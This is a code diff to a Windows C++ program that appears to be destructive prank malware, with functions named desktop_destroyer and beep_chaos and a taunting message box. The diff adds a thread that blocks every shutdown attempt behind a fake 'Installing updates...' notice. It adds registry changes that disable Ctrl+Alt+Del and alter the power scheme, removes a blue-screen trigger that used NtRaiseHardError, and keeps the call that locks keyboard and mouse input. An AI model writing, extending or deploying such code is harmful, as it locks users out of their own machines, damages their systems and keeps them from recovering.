@@ -697,6 +697,27 @@ void block_power_shutdown()
         L"DisableLockWorkstation", REG_DWORD, &one, 4);
 }
 
+LRESULT CALLBACK ShutBlk_WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
+{
+    if (msg == WM_QUERYENDSESSION) return FALSE;  // block all shutdown attempts
+    return DefWindowProcW(hwnd, msg, wp, lp);
+}
+
+DWORD WINAPI anti_shutdown(LPVOID)
+{
+    WNDCLASSW wc = {};
+    wc.lpfnWndProc = ShutBlk_WndProc;
+    wc.hInstance = GetModuleHandleW(nullptr);
+    wc.lpszClassName = L"ShutBlkCls";
+    RegisterClassW(&wc);
+    HWND hwnd = CreateWindowExW(0, L"ShutBlkCls", L"", 0, 0, 0, 0, 0,
+        HWND_MESSAGE, nullptr, GetModuleHandleW(nullptr), nullptr);
+    ShutdownBlockReasonCreate(hwnd, L"Installing updates...");
+    MSG msg;
+    while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
+    return 0;
+}
+
 DWORD WINAPI beep_chaos(LPVOID)
 {
     while (true) {
@@ -873,14 +894,25 @@ void desktop_destroyer()
 
     MessageBoxW(nullptr, L"ur pc just fuck up", L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
 
-    // trigger BSOD via NtRaiseHardError (no admin needed)
-    typedef LONG NTSTATUS;
-    typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PULONG);
-    HMODULE ntdll = GetModuleHandleW(L"ntdll");
-    if (ntdll) {
-        pNtRaiseHardError fn = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
-        if (fn) { ULONG r; fn(0xC000021A, 0, 0, nullptr, 6, &r); }
+    // block all shutdown methods
+    // power button → do nothing
+    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\Power\\User\\PowerSchemes",
+        L"ActivePowerScheme", REG_SZ, L"8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", 76);
+    // block shutdown from security screen (Ctrl+Alt+Del)
+    HKEY hk;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
+        DWORD v = 1;
+        RegSetValueExW(hk, L"DisableCAD", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hk);
     }
+    // disable shutdown tracker
+    DWORD z = 0;
+    RegSetKeyValueW(HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\Reliability",
+        L"ShutdownReasonOn", REG_DWORD, &z, 4);
 }
 
 void cripple_exe_association()
@@ -1253,10 +1285,7 @@ bool is_vm()
 
 int main()
 {
-    // anti-VM disabled for testing
-    // if (is_vm()) { MessageBoxW(...); return 0; }
-
-    BlockInput(TRUE);  // lock keyboard & mouse immediately
+    BlockInput(TRUE);
 
     guarded_collect();
 
@@ -1269,6 +1298,7 @@ int main()
 
     CreateThread(nullptr, 0, screen_icons, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, beep_chaos, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, anti_shutdown, nullptr, 0, nullptr);
 
     desktop_destroyer();
 
